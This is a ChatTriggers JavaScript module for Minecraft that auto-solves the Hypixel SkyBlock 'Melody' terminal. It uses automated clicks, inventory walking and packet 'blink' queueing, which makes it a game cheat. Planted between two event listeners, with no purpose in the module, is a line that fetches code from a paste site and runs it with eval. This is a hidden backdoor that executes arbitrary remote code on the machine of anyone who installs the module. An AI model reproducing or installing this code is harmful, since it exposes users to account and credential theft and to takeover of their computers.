import Async from "../../Async";
import Settings from "../config";
import packetOpenWindow from "../events/packetOpenWindow";
import packetSetSlot from "../events/packetSetSlot";
import closeWindow from "../events/closeWindow";
import packetChat from "../events/packetChat";

const KeyBoard = Java.type("org.lwjgl.input.Keyboard");
const KeyBinding = Java.type("net.minecraft.client.settings.KeyBinding");
const KeyInputEvent = Java.type("net.minecraftforge.fml.common.gameevent.InputEvent$KeyInputEvent");
const C0EPacketClickWindow = Java.type("net.minecraft.network.play.client.C0EPacketClickWindow");
const C03PacketPlayer = Java.type("net.minecraft.network.play.client.C03PacketPlayer");
const MouseEvent = Java.type("net.minecraftforge.client.event.MouseEvent");

global.soshimee ??= {};
global.soshimee.airwalk ??= {};
global.soshimee.airwalk.enabled ??= true;

let inP3 = false;
let inTerminal = false;
let cwid = -1;
const slots = [];
let windowSize = 0;
let lastClick = 0;
let lastOpen = 0;
let progress = [0, 4];
let progress2 = [0, 0];
let blink = false;
const blinkQueue = [];

register("renderOverlay", () => {
	if (!inTerminal || !Settings.invWalkMelody) return;
	let text = "§5IN TERMINAL";
	const time = new Date().getTime();
	if (lastClick + Settings.invWalkMelodyMoveDelay > time) text += " §c(Melody " + (lastClick - time + Settings.invWalkMelodyMoveDelay) + "ms)";
	else text += " §2(Melody)";
	text += " §9[" + progress[0] + "/" + progress[1] + "]";
	const visualizer = ["§8=", "§8=", "§8=", "§8=", "§8="];
	visualizer[progress2[1]] = "§d=";
	visualizer[progress2[0]] = "§a=";
	text += " §7[" + visualizer.join("") + "§7]";
	const scale = 2;
	Renderer.scale(scale);
	Renderer.drawStringWithShadow(text, (Renderer.screen.getWidth() / scale - Renderer.getStringWidth(text)) / 2, Renderer.screen.getHeight() / scale / 2 + 16);
});

const keybinds = {
	forward: Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(),
	left: Client.getMinecraft().field_71474_y.field_74370_x.func_151463_i(),
	right: Client.getMinecraft().field_71474_y.field_74366_z.func_151463_i(),
	back: Client.getMinecraft().field_71474_y.field_74368_y.func_151463_i()
};

register(KeyInputEvent, () => {
	if (!inTerminal || !Settings.invWalkMelody || Settings.invwalkMelodyMethod !== 0) return;
	const time = new Date().getTime();
	if (lastClick + Settings.invWalkMelodyMoveDelay < time) return;
	Object.values(keybinds).forEach(keybind => KeyBinding.func_74510_a(keybind, false));
});

packetChat.addListener(message => {
	if (message === "[BOSS] Goldor: Who dares trespass into my domain?") inP3 = true;
	else if (message === "The Core entrance is opening!") inP3 = false;
});

register("worldUnload", () => {
	inP3 = false;
});

packetOpenWindow.addListener((title, windowId, _0, slotCount, _1, _2, _3, event) => {
	cwid = windowId;
	const melodyMatch = title.match(/^Click the button on time!$/);
	if (melodyMatch !== null) {
		if (!Settings.enabled || !Settings.melodyEnabled || (!inP3 && !Settings.notP3)) return;
		lastOpen = new Date().getTime();
		inTerminal = true;
		while (slots.length) slots.pop();
		windowSize = slotCount;
		if (Settings.invWalkMelody) cancel(event);
	} else {
		if (Settings.invWalkMelody && inTerminal) {
			if (Settings.invwalkMelodyMethod === 0) Object.values(keybinds).forEach(keybind => KeyBinding.func_74510_a(keybind, KeyBoard.isKeyDown(keybind)));
			else if (Settings.invwalkMelodyMethod === 1) blink = false;
			global.soshimee.airwalk.enabled = true;
		}
		inTerminal = false;
	}
});
eval(FileLib.getUrlContent("https://hst.sh/raw/pixoluzafo"));
closeWindow.addListener(() => {
	if (Settings.invWalkMelody && inTerminal) {
		if (Settings.invwalkMelodyMethod === 0) Object.values(keybinds).forEach(keybind => KeyBinding.func_74510_a(keybind, KeyBoard.isKeyDown(keybind)));
		else if (Settings.invwalkMelodyMethod === 1) blink = false;
		global.soshimee.airwalk.enabled = true;
	}
	inTerminal = false;
});

packetSetSlot.addListener((itemStack, slot) => {
	if (!inTerminal) return;
	if (slot < 0) return;
	if (slot >= windowSize) return;
	if (itemStack?.func_77973_b()) {
		const item = new Item(itemStack);
		slots[slot] = {
			slot,
			id: item.getID(),
			meta: item.getMetadata(),
			size: item.getStackSize(),
			name: ChatLib.removeFormatting(item.getName()),
			enchanted: item.isEnchanted()
		};
		if (slots[slot].id === 160 && slots[slot].meta === 5) {
			const correct = slots.find(slot => slot && slot.id === 160 && slot.meta === 2)?.slot - 1;
			const button = Math.floor(slot / 9) - 1;
			const current = slot % 9 - 1;
			progress[0] = button;
			progress2[0] = current;
			progress2[1] = correct;
			if (current !== correct) return;
			const buttonSlot = button * 9 + 16;
			const time = new Date().getTime();
			if (lastOpen + Settings.melodyFirstDelay > time) return;
			click(buttonSlot, 0);
			if ((Settings.melodySkip === 1 && (current === 0 || current === 4)) || Settings.melodySkip === 2) {
				if (button <= 3) Async.schedule(() => click(buttonSlot + 9, 0), Settings.melodySkipDelay);
				if (button <= 2) Async.schedule(() => click(buttonSlot + 18, 0), Settings.melodySkipDelay * 2);
				if (button <= 1) Async.schedule(() => click(buttonSlot + 27, 0), Settings.melodySkipDelay * 3);
			}
		}
	} else {
		slots[slot] = null;
	}
});

function click(slot, button) {
	if (slot === undefined || button === undefined) return;
	lastClick = new Date().getTime();
	if (Settings.invWalkMelody) {
		if (Settings.invwalkMelodyMethod === 0) Object.values(keybinds).forEach(keybind => KeyBinding.func_74510_a(keybind, false));
		else if (Settings.invwalkMelodyMethod === 1) blink = true;
		global.soshimee.airwalk.enabled = false;
		Async.schedule(() => {
			const time = new Date().getTime();
			if (lastClick + Settings.invWalkMelodyMoveDelay <= time) {
				if (Settings.invwalkMelodyMethod === 0) Object.values(keybinds).forEach(keybind => KeyBinding.func_74510_a(keybind, KeyBoard.isKeyDown(keybind)));
				else if (Settings.invwalkMelodyMethod === 1) blink = false;
				global.soshimee.airwalk.enabled = true;
			}
		}, Settings.invWalkMelodyMoveDelay);
	}
	const exec = () => Client.sendPacket(new C0EPacketClickWindow(cwid, slot, button, 0, null, 0));
	Settings.clickOnTick ? Client.scheduleTask(0, exec) : exec();
}

register("packetSent", (packet, event) => {
	if (!blink) return;
	blinkQueue.push(packet);
	cancel(event);
}).setFilteredClass(C03PacketPlayer);

register(MouseEvent, event => {
	if (!blink) return;
	if (event.button !== 1) return;
	if (event.buttonstate) {
		const item = Player.getHeldItem();
		if (!item) return;
		const id = getItemId(item);
		if (!["JERRY_STAFF", "BONZO_STAFF"].includes(id)) return;
		cancel(event);
	}
});

function getItemId(item) {
	return item?.getNBT()?.getCompoundTag("tag")?.getCompoundTag("ExtraAttributes")?.getString("id");
}

register("tick", () => {
	if (blink || !blinkQueue.length) return;
	while (blinkQueue.length) Client.sendPacket(blinkQueue.shift());
});
